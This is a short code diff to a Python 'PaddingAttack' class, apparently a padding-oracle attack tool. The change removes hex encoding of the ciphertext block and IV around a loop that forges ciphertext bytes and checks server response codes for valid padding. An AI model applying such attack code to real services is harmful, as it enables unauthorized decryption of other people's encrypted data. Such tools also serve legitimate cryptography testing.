@@ -14,8 +14,8 @@ class PaddingAttack(object):
     ciphertext
     """
     def __init__(self, enc_block, IV, callback, blocklen=16):
-        self.enc_block = enc_block.decode("hex")
-        self.IV = IV.decode("hex")
+        self.enc_block = enc_block
+        self.IV = IV
         self.callback = callback
         self.blocklen = blocklen
         self.logger = logging.getLogger(__name__)
@@ -31,7 +31,7 @@ class PaddingAttack(object):
                 temp = map(chr, intermediate_bytes)
                 data = data[:self.blocklen-pos] + chr(i) + xord(temp, [chr(pos)]*len(intermediate_bytes))
                 data += self.enc_block
-                return_code = self.callback(data.encode("hex"))
+                return_code = self.callback(data)
                 if return_code == 200:
                     self.logger.debug("[200] Valid decryption obtained.")
                 elif return_code == 500:
